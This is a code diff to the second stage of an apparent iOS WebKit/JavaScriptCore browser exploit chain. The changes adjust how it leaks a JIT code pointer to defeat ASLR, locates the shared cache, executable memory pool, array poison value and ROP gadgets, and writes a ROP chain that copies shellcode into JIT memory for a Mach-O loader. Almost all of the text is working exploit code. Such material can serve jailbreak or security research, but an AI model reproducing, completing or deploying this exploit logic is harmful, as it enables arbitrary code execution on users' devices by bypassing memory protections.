@@ -836,13 +836,13 @@ var stage2 = function()
     print("Element @ 0x" + el);
 
     // We will leak the vtable of the element so that we can calculate the shared cache randomization slide
-    var vtable = primitives.read_i64(el, 0);
-    print("[+] Got vtable @ "+vtable);
+    var nativejitcode = primitives.read_i64(el, 0);
+    print("[+] Got nativejitcode @ "+nativejitcode);
 
     // We can determine the address space randomization slide by simply diffing vtable offset against leaked vtable
-    var slide = vtable - _off.elvtable;
+    var slide = nativejitcode - _off.nativejitcode;
     print("[+] Slide: "+ hexify(slide));
-    dyld_cache_slide(vtable, _off.elvtable);
+    dyld_cache_slide(nativejitcode, _off.nativejitcode);
 
     // iOS devices with a processor pre-A12 use jitWriteSeperateHeapsFunction in the special jitMemCpy
     var jitWriteSeparateHeapsFunctionAddr = slideaddr(_off.jit_writeseperateheaps_func);
@@ -863,29 +863,34 @@ var stage2 = function()
     }
 
     // We want to jitMemCpy our shellcode into the executable memorypool
-    // As probably on iOS 12 the symbols are removed and we can't leak the pool using offsets anymore we need to leak it through instances
-    var startOfFixedExecutableMemoryPool = 0;
-    var endOfFixedExecutableMemoryPool = 0;
+   	print("[+] Finding the executable memorypool.");
+    var startOfFixedExecutableMemoryPool = primitives.read_i64(slideaddr(_off.startfixedmempool), 4);
+    var endOfFixedExecutableMemoryPool = primitives.read_i64(slideaddr(_off.endfixedmempool), 4);
 
+    // Leak the JavaScriptbase
     var jscbase = slideaddr(_off.jscbase);
+
+    print("[+] Calculating shared cache base.");
+    var shared_cache = slideaddr(_off.dyld_shared_cache);
+    print("[+] Retrieving magic.");
+    var scache_magic = primitives.read_i64(shared_cache, 0);
+    print("[+] Got shared cache at "+hexify(shared_cache)+" magic: "+scache_magic);
 
     // These offsets are needed for our ROP based mach-o loader and jitMemCpy
     var disablePrimitiveGigacage = slideaddr(_off.disableprimitivegigacage);
-    var callbacks = slideaddr(_off.callbacks);
+
+	print("[+] Finding the callback vector");
+    var callbacks = primitives.read_i64(slideaddr(_off.callbacks), 0);
    
     var g_gigacageBasePtrs = slideaddr(_off.g_gigacagebaseptrs);
-    var g_typedArrayPoisons = 0;
+    var g_typedArrayPoisons = slideaddr(_off.g_jsarraybufferpoison);
     var longjmp = slideaddr(_off.longjmp);
     var dlsym = slideaddr(_off.dlsym);
     var ptr_stack_chk_guard = slideaddr(_off.ptr_stack_check_guard);
 
 
-    print("[+] Finding the callback vector");
-    var callback_vector = 0;
-    if(callbacks)
-    {
-    	callbacks = primitives.read_i64(callbacks, 0);
-    }
+
+
     
     print("[+] Finding array poison value");
     var poison = 0;
@@ -893,6 +898,14 @@ var stage2 = function()
     {
     	poison = primitives.read_i64(g_typedArrayPoisons, 48);
     }
+    print("[+] poison:"+ poison);
+
+
+    // see jitcode.s (stage3)
+    // This gadget is basically for loading our mach-o
+    // It is used in logic where the loader mimics as if dyld was invoked from kernel
+    // However, stage3 by Luca Todesco is officially closed-source
+    var linkcode_gadget = slideaddr(_off.linkcode_gadget);
 
     print(''
         + '\nASLR Slide ' + hexify(slide) //dyld shared cache slide should be equal to the vtable infoleak minus the vtable offset
@@ -905,8 +918,8 @@ var stage2 = function()
         + '\nlinkCode gadget @ ' + (linkcode_gadget == slide ? "Offset missing" : hexify(linkcode_gadget)) //symbol, used in stage2
         + '\njit_writeseperateheaps_func @ ' + (jitWriteSeparateHeapsFunctionAddr == slide ? "Offset missing" : hexify(jitWriteSeparateHeapsFunctionAddr))
         + '\nuseFastPermisionsJITCopy @ ' +  (useFastPermisionsJITCopyAddr == slide ? "Offset missing" : hexify(useFastPermisionsJITCopyAddr))
-        + '\nstartfixedmempool @ ' + (startOfFixedExecutableMemoryPool == slide ? "Offset missing" : hexify(startOfFixedExecutableMemoryPool))
-        + '\nendfixedmempool @ ' + (endOfFixedExecutableMemoryPool == slide ? "Offset missing" : hexify(endOfFixedExecutableMemoryPool))
+        + '\nstartfixedmempool @ ' + (startOfFixedExecutableMemoryPool == slide ? "Offset missing" : startOfFixedExecutableMemoryPool)
+        + '\nendfixedmempool @ ' + (endOfFixedExecutableMemoryPool == slide ? "Offset missing" : endOfFixedExecutableMemoryPool)
         + '\nptr_stack_check_guard @ ' + (ptr_stack_chk_guard == slide ? "Offset missing" : hexify(ptr_stack_chk_guard))
     );
 
@@ -929,11 +942,6 @@ var stage2 = function()
     //   ret
     var pop_x2 = 0;
 
-    // see jitcode.s (stage3)
-    // This gadget is basically for loading our mach-o
-    // It is used in logic where the loader mimics as if dyld was invoked from kernel
-    // However, stage3 by Luca Todesco is officially closed-source
-    var linkcode_gadget = 0;
 
     var buffer_addr = primitives.addrof(u32_buffer); // Is this poisoned or am I stupid?
     print("[+] Shellcode buffer @ " +buffer_addr);
@@ -942,7 +950,7 @@ var stage2 = function()
     print("[+] Shellcode @ " + shellcode_src);
 
     var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000;
-    print("[+] Shellcode target @ " + shellcode_dst);
+    print("[+] Shellcode target @ " + hexify(shellcode_dst));
 
     // Verify that we would actually end up in the executable memorypool.
    	if(shellcode_dst < startOfFixedExecutableMemoryPool) 
@@ -1002,6 +1010,7 @@ var stage2 = function()
         buffer_addr + 0x2000, // stack pointer (will point to our fake stack)
     ];
 
+    // All this simply is, is a write_non_zero
 	for(var i = 0; i < ropchain.length-1; i++)
 	{
 		print('[+] Writing ropchain (' + i + '/' + (ropchain.length - 1) +')');
